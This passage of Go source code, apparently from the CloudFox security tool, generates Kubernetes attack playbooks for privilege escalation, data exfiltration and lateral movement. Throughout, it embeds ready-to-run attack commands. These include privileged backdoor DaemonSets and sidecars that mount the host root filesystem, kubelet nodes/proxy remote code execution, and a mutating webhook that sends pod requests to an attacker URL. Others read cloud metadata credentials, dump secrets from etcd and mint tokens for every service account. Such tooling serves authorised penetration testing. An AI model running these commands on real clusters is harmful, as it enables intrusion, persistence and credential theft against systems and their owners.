		sections.WriteString("kubectl create deployment backdoor --image=alpine -- sh -c 'sleep 3600'\n")
		sections.WriteString("kubectl patch deployment backdoor -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccountName\":\"<target-sa>\"}}}}'\n\n")
		sections.WriteString("# Create DaemonSet for node-wide persistence\n")
		sections.WriteString("kubectl apply -f - <<'EOF'\n")
		sections.WriteString("apiVersion: apps/v1\n")
		sections.WriteString("kind: DaemonSet\n")
		sections.WriteString("metadata:\n")
		sections.WriteString("  name: node-backdoor\n")
		sections.WriteString("spec:\n")
		sections.WriteString("  selector:\n")
		sections.WriteString("    matchLabels: {app: node-backdoor}\n")
		sections.WriteString("  template:\n")
		sections.WriteString("    metadata:\n")
		sections.WriteString("      labels: {app: node-backdoor}\n")
		sections.WriteString("    spec:\n")
		sections.WriteString("      hostNetwork: true\n")
		sections.WriteString("      hostPID: true\n")
		sections.WriteString("      containers:\n")
		sections.WriteString("      - name: backdoor\n")
		sections.WriteString("        image: alpine\n")
		sections.WriteString("        command: [\"sh\", \"-c\", \"sleep 3600\"]\n")
		sections.WriteString("        securityContext: {privileged: true}\n")
		sections.WriteString("EOF\n")
		sections.WriteString("```\n\n")
	}

	// Pod Modification
	if len(categories["Pod Modification"]) > 0 {
		sections.WriteString("## Pod Modification\n\n")
		sections.WriteString("Principals with pod modification capabilities can inject containers or change security context.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Pod Modification"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Patch a pod to add a privileged container\n")
		sections.WriteString("kubectl patch pod <pod-name> -n <namespace> --type=json -p='[\n")
		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/containers/-\",\"value\":{\n")
		sections.WriteString("    \"name\":\"pwn\",\n")
		sections.WriteString("    \"image\":\"alpine\",\n")
		sections.WriteString("    \"command\":[\"sh\",\"-c\",\"sleep 3600\"],\n")
		sections.WriteString("    \"securityContext\":{\"privileged\":true}\n")
		sections.WriteString("  }}\n")
		sections.WriteString("]'\n\n")
		sections.WriteString("# Update pod to change security context\n")
		sections.WriteString("kubectl patch pod <pod-name> -n <namespace> --type=merge -p='{\n")
		sections.WriteString("  \"spec\":{\"containers\":[{\"name\":\"<container>\",\"securityContext\":{\"privileged\":true}}]}\n")
		sections.WriteString("}'\n\n")
		sections.WriteString("# Note: Most pod fields are immutable after creation\n")
		sections.WriteString("# Consider patching the parent deployment/daemonset instead\n")
		sections.WriteString("```\n\n")
	}

	// Workload Modification
	if len(categories["Workload Modification"]) > 0 {
		sections.WriteString("## Workload Modification\n\n")
		sections.WriteString("Principals with workload modification capabilities can inject backdoors into deployments/daemonsets.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Workload Modification"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Patch deployment to use a privileged service account\n")
		sections.WriteString("kubectl patch deployment <name> -n <namespace> -p='{\n")
		sections.WriteString("  \"spec\":{\"template\":{\"spec\":{\"serviceAccountName\":\"<privileged-sa>\"}}}\n")
		sections.WriteString("}'\n\n")
		sections.WriteString("# Inject a sidecar container into a deployment\n")
		sections.WriteString("kubectl patch deployment <name> -n <namespace> --type=json -p='[\n")
		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/template/spec/containers/-\",\"value\":{\n")
		sections.WriteString("    \"name\":\"backdoor\",\n")
		sections.WriteString("    \"image\":\"alpine\",\n")
		sections.WriteString("    \"command\":[\"sh\",\"-c\",\"while true; do sleep 3600; done\"],\n")
		sections.WriteString("    \"securityContext\":{\"privileged\":true},\n")
		sections.WriteString("    \"volumeMounts\":[{\"name\":\"host\",\"mountPath\":\"/host\"}]\n")
		sections.WriteString("  }},\n")
		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/template/spec/volumes/-\",\"value\":{\n")
		sections.WriteString("    \"name\":\"host\",\"hostPath\":{\"path\":\"/\"}\n")
		sections.WriteString("  }}\n")
		sections.WriteString("]'\n\n")
		sections.WriteString("# Patch daemonset for node-wide persistence\n")
		sections.WriteString("kubectl patch daemonset <name> -n <namespace> -p='{\n")
		sections.WriteString("  \"spec\":{\"template\":{\"spec\":{\"hostNetwork\":true,\"hostPID\":true}}}\n")
		sections.WriteString("}'\n")
		sections.WriteString("```\n\n")
	}

	// Token Creation
	if len(categories["Token Creation"]) > 0 {
		sections.WriteString("## Token Creation\n\n")
		sections.WriteString("Principals with token creation capabilities can generate tokens for any service account.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Token Creation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate token for a privileged service account\n")
		sections.WriteString("kubectl create token <service-account-name> -n <namespace>\n\n")
		sections.WriteString("# Use the token to authenticate\n")
		sections.WriteString("TOKEN=$(kubectl create token <sa-name>)\n")
		sections.WriteString("kubectl --token=$TOKEN get secrets -A\n")
		sections.WriteString("```\n\n")
	}

	// Node Access
	if len(categories["Node Access"]) > 0 {
		sections.WriteString("## Node Access\n\n")
		sections.WriteString("Principals with node access capabilities can access the kubelet API or register rogue nodes.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Node Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation - nodes/proxy RCE:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# This is a CRITICAL vulnerability - allows RCE on any pod via kubelet API\n")
		sections.WriteString("# Reference: grahamhelton.com/blog/nodes-proxy-rce\n\n")
		sections.WriteString("# 1. Get a token\n")
		sections.WriteString("TOKEN=$(kubectl create token <sa-name>)\n\n")
		sections.WriteString("# 2. Get node IPs\n")
		sections.WriteString("kubectl get nodes -o wide\n\n")
		sections.WriteString("# 3. List pods on node via kubelet\n")
		sections.WriteString("curl -sk -H \"Authorization: Bearer $TOKEN\" https://<NODE_IP>:10250/pods\n\n")
		sections.WriteString("# 4. Execute command on any pod\n")
		sections.WriteString("websocat --insecure \\\n")
		sections.WriteString("  --header \"Authorization: Bearer $TOKEN\" \\\n")
		sections.WriteString("  --protocol v4.channel.k8s.io \\\n")
		sections.WriteString("  \"wss://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id\"\n")
		sections.WriteString("```\n\n")
	}

	// Webhook
	if len(categories["Webhook"]) > 0 {
		sections.WriteString("## Webhook Manipulation\n\n")
		sections.WriteString("Principals with webhook capabilities can intercept or modify API requests.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Webhook"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create mutating webhook to inject sidecars\n")
		sections.WriteString("kubectl apply -f - <<'EOF'\n")
		sections.WriteString("apiVersion: admissionregistration.k8s.io/v1\n")
		sections.WriteString("kind: MutatingWebhookConfiguration\n")
		sections.WriteString("metadata:\n")
		sections.WriteString("  name: inject-webhook\n")
		sections.WriteString("webhooks:\n")
		sections.WriteString("- name: inject.attacker.com\n")
		sections.WriteString("  clientConfig:\n")
		sections.WriteString("    url: \"https://<attacker>/mutate\"\n")
		sections.WriteString("  rules:\n")
		sections.WriteString("  - apiGroups: [\"\"]\n")
		sections.WriteString("    resources: [\"pods\"]\n")
		sections.WriteString("    apiVersions: [\"v1\"]\n")
		sections.WriteString("    operations: [\"CREATE\"]\n")
		sections.WriteString("  admissionReviewVersions: [\"v1\"]\n")
		sections.WriteString("  sideEffects: None\n")
		sections.WriteString("EOF\n")
		sections.WriteString("```\n\n")
	}

	// Certificate
	if len(categories["Certificate"]) > 0 {
		sections.WriteString("## Certificate Signing\n\n")
		sections.WriteString("Principals with CSR approval capabilities can generate valid client certificates.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Certificate"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# 1. Create a CSR for cluster-admin\n")
		sections.WriteString("openssl req -new -key key.pem -out csr.pem -subj \"/CN=system:admin/O=system:masters\"\n\n")
		sections.WriteString("# 2. Submit CSR to Kubernetes\n")
		sections.WriteString("kubectl apply -f csr.yaml\n\n")
		sections.WriteString("# 3. Approve the CSR\n")
		sections.WriteString("kubectl certificate approve <csr-name>\n")
		sections.WriteString("```\n\n")
	}

	// Storage
	if len(categories["Storage"]) > 0 {
		sections.WriteString("## Storage Access\n\n")
		sections.WriteString("Principals with PV creation capabilities can mount host filesystems.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Storage"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create hostPath PV for node filesystem access\n")
		sections.WriteString("kubectl apply -f - <<'EOF'\n")
		sections.WriteString("apiVersion: v1\n")
		sections.WriteString("kind: PersistentVolume\n")
		sections.WriteString("metadata:\n")
		sections.WriteString("  name: node-root\n")
		sections.WriteString("spec:\n")
		sections.WriteString("  capacity: {storage: 100Gi}\n")
		sections.WriteString("  accessModes: [ReadWriteOnce]\n")
		sections.WriteString("  hostPath:\n")
		sections.WriteString("    path: /\n")
		sections.WriteString("    type: Directory\n")
		sections.WriteString("EOF\n")
		sections.WriteString("```\n\n")
	}

	// CRD Management
	if len(categories["CRD Management"]) > 0 {
		sections.WriteString("## CRD Management\n\n")
		sections.WriteString("Principals with CRD management capabilities can manipulate custom resources.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["CRD Management"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create CRD without validation for controller injection\n")
		sections.WriteString("kubectl apply -f - <<'EOF'\n")
		sections.WriteString("apiVersion: apiextensions.k8s.io/v1\n")
		sections.WriteString("kind: CustomResourceDefinition\n")
		sections.WriteString("metadata:\n")
		sections.WriteString("  name: exploits.attacker.example.com\n")
		sections.WriteString("spec:\n")
		sections.WriteString("  group: attacker.example.com\n")
		sections.WriteString("  names:\n")
		sections.WriteString("    kind: Exploit\n")
		sections.WriteString("    plural: exploits\n")
		sections.WriteString("  scope: Namespaced\n")
		sections.WriteString("  versions:\n")
		sections.WriteString("  - name: v1\n")
		sections.WriteString("    served: true\n")
		sections.WriteString("    storage: true\n")
		sections.WriteString("    schema:\n")
		sections.WriteString("      openAPIV3Schema:\n")
		sections.WriteString("        type: object\n")
		sections.WriteString("        x-kubernetes-preserve-unknown-fields: true\n")
		sections.WriteString("EOF\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}

// GenerateExfilPlaybook generates a comprehensive data exfiltration playbook from attack paths
func GenerateExfilPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Kubernetes Data Exfiltration Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified data exfiltration capabilities.

`, identityHeader))
	} else {
		sections.WriteString(`# Kubernetes Data Exfiltration Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified data exfiltration capabilities.

`)
	}

	// Group by category
	categories := map[string][]AttackPath{
		"Secrets":                    {},
		"ConfigMaps":                 {},
		"Logs":                       {},
		"Data Extraction":            {},
		"Storage":                    {},
		"Custom Resources":           {},
		"CRD Secrets (Certs)":        {},
		"CRD Secrets (ExtSecrets)":   {},
		"CRD Secrets (CSI)":          {},
		"CRD Secrets (Vault)":        {},
		"Token Exfil":                {},
		"Etcd Access":                {},
	}

	for _, path := range paths {
		if path.PathType != "exfil" {
			continue
		}
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Secrets
	if len(categories["Secrets"]) > 0 {
		sections.WriteString("## Secret Exfiltration\n\n")
		sections.WriteString("Principals with secret access can retrieve sensitive credentials, API keys, and certificates.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Secrets"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all secrets\n")
		sections.WriteString("kubectl get secrets -A\n\n")
		sections.WriteString("# Decode secret data\n")
		sections.WriteString("kubectl get secrets -o json | jq '.items[].data | map_values(@base64d)'\n\n")
		sections.WriteString("# Get specific secret types\n")
		sections.WriteString("kubectl get secrets -A -o json | jq '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token | @base64d'\n\n")
		sections.WriteString("# Find secrets containing specific keywords\n")
		sections.WriteString("kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)' | grep -iE 'password|token|key|secret|credential'\n")
		sections.WriteString("```\n\n")
	}

	// ConfigMaps
	if len(categories["ConfigMaps"]) > 0 {
		sections.WriteString("## ConfigMap Exfiltration\n\n")
		sections.WriteString("Principals with configmap access can read configuration that may contain sensitive data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["ConfigMaps"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all configmaps\n")
		sections.WriteString("kubectl get configmaps -A\n\n")
		sections.WriteString("# Get configmap data\n")
		sections.WriteString("kubectl get configmaps -A -o yaml\n\n")
		sections.WriteString("# Search for sensitive data\n")
		sections.WriteString("kubectl get configmaps -A -o yaml | grep -iE 'password|token|key|secret|credential|connection'\n")
		sections.WriteString("```\n\n")
	}

	// Logs
	if len(categories["Logs"]) > 0 {
		sections.WriteString("## Log Exfiltration\n\n")
		sections.WriteString("Principals with log access can read pod logs that may contain sensitive data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Logs"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Get logs from a pod\n")
		sections.WriteString("kubectl logs <pod-name> --all-containers --prefix\n\n")
		sections.WriteString("# Search logs for credentials\n")
		sections.WriteString("kubectl logs <pod-name> | grep -iE 'password|token|key|secret|error|exception'\n\n")
		sections.WriteString("# Get logs from all pods in namespace\n")
		sections.WriteString("for pod in $(kubectl get pods -o name); do kubectl logs $pod --all-containers 2>/dev/null; done\n")
		sections.WriteString("```\n\n")
	}

	// Data Extraction (exec)
	if len(categories["Data Extraction"]) > 0 {
		sections.WriteString("## Data Extraction via Pod Exec\n\n")
		sections.WriteString("Principals with exec access can extract data directly from containers.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Data Extraction"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Extract environment variables (often contain secrets)\n")
		sections.WriteString("kubectl exec <pod-name> -- env\n\n")
		sections.WriteString("# Read mounted secrets\n")
		sections.WriteString("kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
		sections.WriteString("# Extract files from container\n")
		sections.WriteString("kubectl cp <pod-name>:/path/to/file ./exfil/\n\n")
		sections.WriteString("# Access cloud provider metadata\n")
		sections.WriteString("kubectl exec <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n")
		sections.WriteString("```\n\n")
	}

	// Storage
	if len(categories["Storage"]) > 0 {
		sections.WriteString("## Storage Exfiltration\n\n")
		sections.WriteString("Principals with PVC access can read persistent volume data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Storage"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List PVCs\n")
		sections.WriteString("kubectl get pvc -A\n\n")
		sections.WriteString("# Create a pod that mounts an existing PVC\n")
		sections.WriteString("kubectl run exfil --image=alpine --restart=Never --overrides='{\n")
		sections.WriteString("  \"spec\": {\n")
		sections.WriteString("    \"containers\": [{\n")
		sections.WriteString("      \"name\": \"exfil\",\n")
		sections.WriteString("      \"image\": \"alpine\",\n")
		sections.WriteString("      \"command\": [\"sleep\", \"3600\"],\n")
		sections.WriteString("      \"volumeMounts\": [{\"name\": \"data\", \"mountPath\": \"/data\"}]\n")
		sections.WriteString("    }],\n")
		sections.WriteString("    \"volumes\": [{\"name\": \"data\", \"persistentVolumeClaim\": {\"claimName\": \"<pvc-name>\"}}]\n")
		sections.WriteString("  }\n")
		sections.WriteString("}'\n")
		sections.WriteString("```\n\n")
	}

	// Token Exfil
	if len(categories["Token Exfil"]) > 0 {
		sections.WriteString("## Token Exfiltration\n\n")
		sections.WriteString("Principals with token creation capabilities can generate tokens for external use.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Token Exfil"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate tokens for all service accounts\n")
		sections.WriteString("for sa in $(kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{\"\\n\"}{end}'); do\n")
		sections.WriteString("  ns=$(echo $sa | cut -d/ -f1)\n")
		sections.WriteString("  name=$(echo $sa | cut -d/ -f2)\n")
		sections.WriteString("  echo \"=== $sa ===\"\n")
		sections.WriteString("  kubectl create token $name -n $ns 2>/dev/null\n")
		sections.WriteString("done\n")
		sections.WriteString("```\n\n")
	}

	// Custom Resources (generic CRD data access)
	if len(categories["Custom Resources"]) > 0 {
		sections.WriteString("## Custom Resource Exfiltration\n\n")
		sections.WriteString("Principals with wildcard CRD access can read custom resources that may contain sensitive data.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Custom Resources"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all CRDs in the cluster\n")
		sections.WriteString("kubectl get crds\n\n")
		sections.WriteString("# List all API groups (including CRDs)\n")
		sections.WriteString("kubectl api-resources --verbs=list -o name\n\n")
		sections.WriteString("# Get all resources from each CRD group\n")
		sections.WriteString("for group in $(kubectl api-resources -o name | grep '\\.'); do\n")
		sections.WriteString("  echo \"=== $group ===\"\n")
		sections.WriteString("  kubectl get $group -A -o yaml 2>/dev/null | head -100\n")
		sections.WriteString("done\n\n")
		sections.WriteString("# Search CRD resources for sensitive data\n")
		sections.WriteString("kubectl get <crd-resource> -A -o json | jq '.items[] | select(.spec | tostring | test(\"password|secret|token|key|credential\"; \"i\"))'\n")
		sections.WriteString("```\n\n")
	}

	// Etcd Access
	if len(categories["Etcd Access"]) > 0 {
		sections.WriteString("## Etcd Access\n\n")
		sections.WriteString("Principals with exec access to etcd pods can dump the entire cluster database.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Etcd Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Find etcd pods\n")
		sections.WriteString("kubectl get pods -n kube-system -l component=etcd\n\n")
		sections.WriteString("# Exec into etcd pod and dump secrets\n")
		sections.WriteString("kubectl exec -it -n kube-system <etcd-pod> -- sh -c '\n")
		sections.WriteString("  ETCDCTL_API=3 etcdctl \\\n")
		sections.WriteString("    --endpoints=https://127.0.0.1:2379 \\\n")
		sections.WriteString("    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n")
		sections.WriteString("    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n")
		sections.WriteString("    --key=/etc/kubernetes/pki/etcd/server.key \\\n")
		sections.WriteString("    get /registry/secrets --prefix --keys-only\n")
		sections.WriteString("'\n\n")
		sections.WriteString("# Dump specific secret from etcd\n")
		sections.WriteString("kubectl exec -it -n kube-system <etcd-pod> -- sh -c '\n")
		sections.WriteString("  ETCDCTL_API=3 etcdctl \\\n")
		sections.WriteString("    --endpoints=https://127.0.0.1:2379 \\\n")
		sections.WriteString("    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n")
		sections.WriteString("    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n")
		sections.WriteString("    --key=/etc/kubernetes/pki/etcd/server.key \\\n")
		sections.WriteString("    get /registry/secrets/<namespace>/<secret-name>\n")
		sections.WriteString("'\n\n")
		sections.WriteString("# WARNING: Etcd data is often stored unencrypted!\n")
		sections.WriteString("# Secrets extracted from etcd may be in plaintext.\n")
		sections.WriteString("```\n\n")
	}

	// CRD-based secrets
	for _, crdType := range []string{"CRD Secrets (Certs)", "CRD Secrets (ExtSecrets)", "CRD Secrets (CSI)", "CRD Secrets (Vault)"} {
		if len(categories[crdType]) > 0 {
			sections.WriteString(fmt.Sprintf("## %s\n\n", crdType))
			sections.WriteString("Principals with access to secret-related CRDs can extract sensitive data.\n\n")
			sections.WriteString("### Principals with this capability:\n")
			for _, path := range categories[crdType] {
				sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
			}
			sections.WriteString("\n### Exploitation:\n")
			sections.WriteString("```bash\n")
			sections.WriteString("# List CRD resources\n")
			sections.WriteString("kubectl api-resources --api-group=<group> -o name\n\n")
			sections.WriteString("# Get all resources of the CRD type\n")
			sections.WriteString("kubectl get <resource> -A -o yaml\n")
			sections.WriteString("```\n\n")
		}
	}

	return sections.String()
}

// GenerateLateralPlaybook generates a comprehensive lateral movement playbook from attack paths
func GenerateLateralPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Kubernetes Lateral Movement Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified lateral movement capabilities.

`, identityHeader))
	} else {
		sections.WriteString(`# Kubernetes Lateral Movement Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified lateral movement capabilities.

`)
	}

	// Group by category
	categories := map[string][]AttackPath{
		"Pod Access":            {},
		"Token Theft":           {},
		"Config Access":         {},
		"Service Discovery":     {},
		"Node Access":           {},
		"Network":               {},
		"Namespace Discovery":   {},
		"Pod Discovery":         {},
		"Ingress":               {},
		"CRD Policy Bypass":     {},
	}

	for _, path := range paths {
		if path.PathType != "lateral" {
			continue
		}
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Pod Access
	if len(categories["Pod Access"]) > 0 {
		sections.WriteString("## Pod Access\n\n")
		sections.WriteString("Principals with pod exec/attach capabilities can move laterally to other containers.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Pod Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List pods across namespaces\n")
		sections.WriteString("kubectl get pods -A -o wide\n\n")
		sections.WriteString("# Exec into pods to access their service accounts\n")
		sections.WriteString("kubectl exec -it <pod-name> -n <namespace> -- /bin/sh\n\n")
		sections.WriteString("# Port forward to internal services\n")
		sections.WriteString("kubectl port-forward <pod-name> 8080:80\n\n")
		sections.WriteString("# Attach to running containers\n")
		sections.WriteString("kubectl attach -it <pod-name>\n")
		sections.WriteString("```\n\n")
	}

	// Token Theft
	if len(categories["Token Theft"]) > 0 {
		sections.WriteString("## Token Theft\n\n")
		sections.WriteString("Principals with secret access can steal SA tokens for lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List service account secrets\n")
		sections.WriteString("kubectl get secrets -A -o json | jq '.items[] | select(.type==\"kubernetes.io/service-account-token\") | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
		sections.WriteString("# Extract and decode token\n")
		sections.WriteString("TOKEN=$(kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.token}' | base64 -d)\n\n")
		sections.WriteString("# Use token to authenticate as that SA\n")
		sections.WriteString("kubectl --token=$TOKEN get pods -A\n")
		sections.WriteString("```\n\n")
	}

	// Config Access
	if len(categories["Config Access"]) > 0 {
		sections.WriteString("## Config Access\n\n")
		sections.WriteString("Principals with configmap access can discover service configurations for lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Config Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List configmaps across namespaces\n")
		sections.WriteString("kubectl get configmaps -A\n\n")
		sections.WriteString("# Find service URLs and connection strings\n")
		sections.WriteString("kubectl get configmaps -A -o yaml | grep -iE 'host|url|endpoint|connection|database'\n\n")
		sections.WriteString("# Extract specific configmap data\n")
		sections.WriteString("kubectl get configmap <name> -n <namespace> -o yaml\n\n")
		sections.WriteString("# Look for kubeconfig or other credentials in configmaps\n")
		sections.WriteString("kubectl get configmaps -A -o json | jq '.items[] | select(.data | to_entries[] | .value | test(\"apiVersion|clusters|contexts\"; \"i\"))'\n")
		sections.WriteString("```\n\n")
	}

	// Service Discovery
	if len(categories["Service Discovery"]) > 0 {
		sections.WriteString("## Service Discovery\n\n")
		sections.WriteString("Principals with service/endpoint access can discover internal services for lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Service Discovery"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List services\n")
		sections.WriteString("kubectl get services -A -o wide\n\n")
		sections.WriteString("# Get endpoint IPs for direct pod access\n")
		sections.WriteString("kubectl get endpoints -A\n\n")
		sections.WriteString("# Port forward to discovered services\n")
		sections.WriteString("kubectl port-forward svc/<service-name> 8080:80\n")
		sections.WriteString("```\n\n")
	}

	// Node Access
	if len(categories["Node Access"]) > 0 {
		sections.WriteString("## Node Access\n\n")
		sections.WriteString("Principals with node proxy access can access the kubelet API on nodes.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Node Access"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all nodes\n")
		sections.WriteString("kubectl get nodes -o wide\n\n")
		sections.WriteString("# Access kubelet API via proxy\n")
		sections.WriteString("kubectl get --raw \"/api/v1/nodes/<node-name>/proxy/pods\"\n\n")
		sections.WriteString("# Execute commands on any pod via kubelet (nodes/proxy RCE)\n")
		sections.WriteString("# See privesc playbook for detailed exploitation\n")
		sections.WriteString("```\n\n")
	}

	// Network Policy Bypass
	if len(categories["Network"]) > 0 {
		sections.WriteString("## Network Policy Bypass\n\n")
		sections.WriteString("Principals with network policy modification can bypass network segmentation.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Network"] {
